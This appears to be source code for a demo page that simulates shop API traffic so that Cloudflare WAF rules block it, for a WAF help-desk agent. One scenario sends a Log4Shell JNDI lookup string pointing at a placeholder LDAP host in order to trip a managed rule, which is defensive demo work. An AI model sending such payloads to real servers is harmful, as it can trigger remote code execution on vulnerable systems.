/**
 * GET /simulate: buttons that send real requests to the shop API from the browser, so the demo WAF
 * rules block them at Cloudflare's edge. Each block is forwarded to the agent (POST /api/events)
 * and comes with a ready-to-paste #waf-help message. Synthetic traffic only.
 */
export function renderSimulatePage() {
  return `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Simulate traffic · #waf-help</title>
<style>
:root { --bg:#fff; --fg:#1f2328; --muted:#59636e; --line:#d1d9e0; --panel:#f6f8fa; --ok:#1a7f37; --bad:#cf222e; --accent:#f6821f; }
@media (prefers-color-scheme: dark) { :root { --bg:#0d1117; --fg:#e6edf3; --muted:#9198a1; --line:#3d444d; --panel:#151b23; --ok:#3fb950; --bad:#f85149; } }
* { box-sizing: border-box; }
body { margin: 0; background: var(--bg); color: var(--fg); font: 14px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; }
main { max-width: 860px; margin: 0 auto; padding: 24px 16px 48px; }
h1 { font-size: 22px; margin: 0 0 4px; }
.sub { color: var(--muted); margin: 0 0 20px; }
a { color: var(--accent); }
.card { border: 1px solid var(--line); border-radius: 8px; padding: 14px 16px; margin-bottom: 12px; }
.row { display: flex; gap: 12px; align-items: flex-start; justify-content: space-between; flex-wrap: wrap; }
.card h2 { font-size: 15px; margin: 0 0 2px; }
.card p { margin: 0; color: var(--muted); }
button { font: inherit; border: 1px solid var(--line); background: var(--panel); color: var(--fg); border-radius: 6px; padding: 6px 12px; cursor: pointer; }
button.primary { background: var(--accent); border-color: var(--accent); color: #fff; }
button:disabled { opacity: .6; cursor: wait; }
.result { margin-top: 10px; font: 12px/1.6 ui-monospace, SFMono-Regular, Menlo, monospace; }
.result:empty { display: none; }
.ok { color: var(--ok); font-weight: 600; } .bad { color: var(--bad); font-weight: 600; }
.ask { margin-top: 8px; background: var(--panel); border: 1px solid var(--line); border-radius: 6px; padding: 8px 10px; font: 13px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; display: flex; gap: 8px; align-items: flex-start; justify-content: space-between; }
.ask span { overflow-wrap: anywhere; }
label { display: flex; gap: 6px; align-items: center; color: var(--muted); margin-bottom: 16px; flex-wrap: wrap; }
input { font: inherit; padding: 4px 8px; border: 1px solid var(--line); border-radius: 6px; background: var(--bg); color: var(--fg); min-width: 0; flex: 1; max-width: 380px; }
code { font: 12px ui-monospace, SFMono-Regular, Menlo, monospace; background: var(--panel); padding: 1px 5px; border-radius: 4px; }
</style></head><body><main>
<h1>Simulate shop traffic</h1>
<p class="sub">Each button sends a real request to <code>/api/shop/*</code> on this hostname, and the Cloudflare WAF decides at the edge. Then take the Ray ID to <a href="/" target="waf-help">#waf-help</a>.</p>
<label>x-client-id (after a fix is approved) <input id="xcid" placeholder="optional: xcid_…" autocomplete="off"></label>

<div class="card"><div class="row"><div><h2>Kitchen planner: save a 300 KB 3D design</h2>
<p>POST /api/shop/kitchen-planner/designs. A normal design export, larger than the WAF can inspect.</p></div>
<button class="primary" data-run="kitchen">Send</button></div><div class="result" id="r-kitchen"></div></div>

<div class="card"><div class="row"><div><h2>SOC threat-intel: look up a Log4Shell IOC</h2>
<p>GET /api/shop/soc/lookup?ioc=\${jndi:ldap://…}. The security team searching its own feed for an exploit string.</p></div>
<button class="primary" data-run="soc">Send</button></div><div class="result" id="r-soc"></div></div>

<div class="card"><div class="row"><div><h2>Store stock checker: 8 lookups in a burst</h2>
<p>GET /api/shop/stock. A store app refreshing BILLY stock on a busy Saturday.</p></div>
<button class="primary" data-run="stock">Send 8</button></div><div class="result" id="r-stock"></div></div>

<div class="card"><div class="row"><div><h2>Store inventory sync job (python-requests)</h2>
<p>A browser cannot change its User-Agent, so run this one from a terminal: <code>./scripts/demo-blocks.sh</code></p></div></div></div>

<script>
const HOST = location.host;
let myIp = "";
fetch("/cdn-cgi/trace").then((r) => r.text()).then((t) => { myIp = (t.match(/^ip=(.*)$/m) || [])[1] || ""; }).catch(() => {});

const SCENARIOS = {
  kitchen: { label: "kitchen planner design uploads", scenario: "custom", method: "POST", path: "/api/shop/kitchen-planner/designs", query: "",
    body: () => JSON.stringify({ design: "kitchen-3d-export", units: "cm", mesh: "A".repeat(300000) }) },
  soc: { label: "SOC threat-intel lookups", scenario: "managed", method: "GET", path: "/api/shop/soc/lookup",
    query: "?ioc=" + encodeURIComponent("\${jndi:ldap://203.0.113.66:1389/a}") },
  stock: { label: "store stock checker lookups", scenario: "ratelimit", method: "GET", path: "/api/shop/stock", query: "?item=BILLY-80x28&store=445", times: 8 }
};

function el(tag, cls, text) {
  const node = document.createElement(tag);
  if (cls) node.className = cls;
  if (text) node.textContent = text;
  return node;
}

async function send(s) {
  const headers = {};
  const xcid = document.getElementById("xcid").value.trim();
  if (xcid) headers["x-client-id"] = xcid;
  if (s.body) headers["content-type"] = "application/json";
  const res = await fetch(s.path + s.query, { method: s.method, headers, body: s.body ? s.body() : undefined, cache: "no-store" });
  return { status: res.status, ray: res.headers.get("cf-ray") || "" };
}

async function run(key) {
  const s = SCENARIOS[key];
  const out = document.getElementById("r-" + key);
  const btn = document.querySelector('[data-run="' + key + '"]');
  btn.disabled = true;
  out.replaceChildren();
  const results = [];
  for (let i = 0; i < (s.times || 1); i++) {
    const r = await send(s).catch(() => ({ status: "error", ray: "" }));
    results.push(r);
    const line = el("div");
    line.append(el("span", r.status === 200 ? "ok" : "bad", "HTTP " + r.status), "  Ray ID " + r.ray);
    out.append(line);
  }
  const blocked = results.filter((r) => r.status === 403 || r.status === 429);
  if (blocked.length) {
    const now = new Date().toISOString().replace(/[.][0-9]+Z$/, "Z");
    fetch("/api/events", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(blocked.map((r) => ({
      rayId: r.ray, datetime: now, scenario: s.scenario, status: r.status, method: s.method, path: s.path,
      query: decodeURIComponent(s.query), userAgent: navigator.userAgent, clientIP: myIp
    }))) }).catch(() => {});
    const msg = "Hey #waf-help, our " + s.label + " are being blocked by Cloudflare. Ray ID " + blocked[0].ray +
      ", host " + HOST + (myIp ? ", our IP " + myIp : "") + ". Can you help?";
    const ask = el("div", "ask");
    const copy = el("button", "", "Copy");
    copy.onclick = () => { navigator.clipboard.writeText(msg); copy.textContent = "Copied"; };
    ask.append(el("span", "", msg), copy);
    out.append(ask);
  }
  btn.disabled = false;
}
document.querySelectorAll("[data-run]").forEach((b) => { b.onclick = () => run(b.dataset.run); });
</script>
</main></body></html>`;
}
